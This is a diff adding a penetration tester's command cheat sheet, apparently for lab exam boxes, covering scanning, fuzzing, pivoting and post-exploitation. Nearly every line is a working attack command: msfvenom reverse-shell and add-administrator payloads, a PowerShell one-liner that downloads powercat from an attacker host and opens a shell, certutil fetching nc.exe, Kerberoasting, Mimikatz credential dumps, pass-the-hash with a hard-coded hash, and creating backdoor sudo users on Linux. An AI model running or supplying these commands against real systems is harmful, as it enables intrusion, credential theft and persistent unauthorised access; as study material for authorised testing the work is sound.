@@ -1,0 +1,148 @@
+================================================================================ Flags
+Windows
+===
+dir C:\Users\Administrator\desktop
+hostname
+whoami
+ipconfig
+type C:\Users\Administrator\desktop\proof.txt
+type C:\Users\<USER>\desktop\local.txt
+===========================
+LINUX
+===
+hostname
+ls /root
+id
+ifconfig
+cat /root/proof.txt
+cat /home/<USER>/local.txt
+================================================================================ ALWAYS BEFORE BOX
+export_commands
+reinit_commands_record
+
+================================================================================ NETWORK Scans
+=== fastest port discovery
+rustscan -a 192.168.66.252 -- -A -sC -sV -Pn
+rustscan -a 192.168.66.252
+nmap --min-rate 4500 --max-rtt-timeout 1500ms scanme.nmap.org -p-
+=== complete scan (background)
+sudo env "PATH=$PATH" autorecon 192.168.66.252
+=== Windows scan
+crackmapexec smb 192.168.66.0/24
+nmap -Pn -sV -oA nmap/windows -vvv -p 111,135,139,389,445,1433,3268,3389 192.168.66.0/24
+=== Scan behind proxychains
+proxychains nmap -n -Pn -F -sV -sT -oA nmap/init -vvv 172.16.42.0/24 -T4 --max-retries 1 --max-rtt-timeout 2s --ttl 50ms --open
+proxychains nmap -n -Pn -F -sV -sT -oA nmap/init -vvv -iL targets -T4 --max-retries 1 --max-rtt-timeout 2s --ttl 50ms --open
+
+================================================================================ WEB
+=== Fuzzing urls
+ffuf -c -u http://192.168.66.252:8000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
+ffuf -c -u http://192.168.66.252:8000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
+ffuf -c -u https://192.168.66.252:443/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
+=== Subdomains enumeration
+ffuf -u "https://FUZZ.target.com" -w <path_to_wordlist> -mc 200,301,302,403
+===Reco
+whatweb http://192.168.66.252:8000/
+
+================================================================================ REVERSE SHELLS/PAYLOADS
+===msfconsole one liner TCP revshell handler
+msfconsole -x "use exploit/multi/handler;set payload windows/x64/shell_reverse_tcp;set lport 443;set lhost tun0;set exitonsession false;exploit -j -z"
+socat -d -d TCP4-LISTEN:443,fork -
+===Generate reverse TCP shell (Windows)
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.66.66 LPORT=443 -f exe -o revshell443.exe
+===Generate reverse TCP shell (Linux)
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.66.66 LPORT=443 -f elf -o revshell443.elf
+===DLL revshell (Windows)
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.66.66 LPORT=443 -f dll -o revshell443.dll
+===Cient Side revshell (Windows)
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.66.66 LPORT=443 -f hta-psh -o /var/www/html/evil.hta
+===Powercat oneliner reverse shell
+powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.66.66/windows/powercat.ps1');powercat -c 192.168.66.66 -p 443 -e cmd"
+===Add Admin user (Windows)
+msfvenom -a x86 --platform Windows -p windows/exec CMD='cmd /C "net user toto toto1234 /add & net localgroup administrators toto /add"' -f exe > /home/kali/share/addadminuser.exe
+msfvenom -a x64 --platform Windows -p windows/x64/exec CMD='cmd /C "net user toto toto1234 /add & net localgroup administrators toto /add"' -f exe > /home/kali/share/addadminuser.exe
+
+================================================================================ REVERSE SHELLS/PAYLOADS
+===Enum Domain Computers (powerview)
+Get-ADComputer -Filter * -Properties *
+Get-ADGroup -Filter * 
+=== Kerberoast (Powersploit)
+Invoke-Kerberoast -domain jedi.local | Export-CSV -NoTypeInformation output.csv
+john --session=Kerberoasting output.csv
+=== Kerberoast (Impacket)
+GetUserSPNs.py -request -dc-ip 192.168.66.24 -hashes :b4b9b02e6f09a9bd760f388b67351e2b jedi.local/luke -outputfile hashes.kerberoast
+=== Kerberoast (Rubeus)
+Rubeus.exe kerberoast /outfile:hashes.kerberoast
+===Cracking
+john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
+hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
+
+================================================================================ PIVOTING
+=== remote SSH tunnel
+ssh -N -R *:8080:127.0.0.1:443 mando@192.168.66.254
+⇒ 192.168.66.254 listen on port 8080 and forward to local port 443
+⇒ Use ss -nlt on 192.168.66.254 if needed (8080 should be listening)
+=== Chisel
+=kali:
+chisel server -p 8000 --reverse
+=victim:
+chisel client 192.168.66.66:8000 R:socks	
+chisel client 192.168.66.66:8000 R:80:127.0.0.1:80	
+chisel client 192.168.66.66:8000 R:4444:10.10.10.240:80	
+
+================================================================================ PAYLOAD Delivery
+===SMB
+=kali:
+impacket-smbserver share /home/kali/share -smb2support -username toto -password toto
+=victim:
+net use v: \\192.168.119.249\share /user:toto toto
+net use * /delete /yes
+===RDP
+rdesktop -r disk:tmp=/home/kali/share -u luke -p Passw0rd -k fr 192.168.66.42
+xfreerdp /u:luke /p:Passw0rd /cert:ignore /v:192.168.66.42 /drive:/home/kali/share,share
+===HTTP
+certutil.exe -urlcache -split -f http://192.168.66.66/nc.exe c:\windows\temp\nc.exe
+
+
+================================================================================ POST EXPLOIT (Windows)
+===Mimikatz
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
+mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit
+===Pass the Hash
+cme smb 192.168.66.0/24 -u administrator -H 'b4b9b02e6f09a9bd760f388b67351e2b ' --local-auth
+impacket-smbexec jedi.local/luke@192.168.66.42 -hashes :b4b9b02e6f09a9bd760f388b67351e2b  -codec 437
+pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:b4b9b02e6f09a9bd760f388b67351e2b' //192.168.66.42 cmd.exe
+lsassy 192.168.66.42 -d . -u Administrator -H b4b9b02e6f09a9bd760f388b67351e2b 
+crackmapexec smb 192.168.66.42 -d . -u Administrator -H b4b9b02e6f09a9bd760f388b67351e2b -M lsassy
+ruby evil-winrm.rb -i 192.168.66.42 -u admin -H b4b9b02e6f09a9bd760f388b67351e2b 
+===Local pass the hash (MIMIKATZ)
+sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:HASH /run:COMMAND
+sekurlsa::pth /user:luke /domain:jedi.local /ntlm:b4b9b02e6f09a9bd760f388b67351e2b /run:c:\Users\Administrator\Desktop\revshell64.exe
+===Find like on windows
+dir c: /s | findstr /i proof.txt
+dir c: /s | findstr /i local.txt
+
+================================================================================ POST EXPLOIT (LINUX)
+===Add root user
+useradd toto -g sudo -p $(openssl passwd -1 toto1234) -m -d /home/toto -s /bin/bash
+useradd regis -g sudo -m -d /home/regis -s /bin/bash
+echo regis:regis1234 | chpasswd
+===Grep passwords
+grep -irE '(password|pwd|pass)[[:space:]]*=[[:space:]]*[[:alpha:]]+' *
+
+
+
+================================================================================ CRACKING
+===Local
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes
+
+================================================================================ SHELL UPGRADE
+python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+script -qc /bin/bash /dev/null
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
+export TERM=xterm-256color
+alias ll='ls -lsaht --color=auto'
+Keyboard Shortcut: Ctrl + Z (Background Process.)
+stty raw -echo ; fg ; reset
+stty columns 200 rows 200
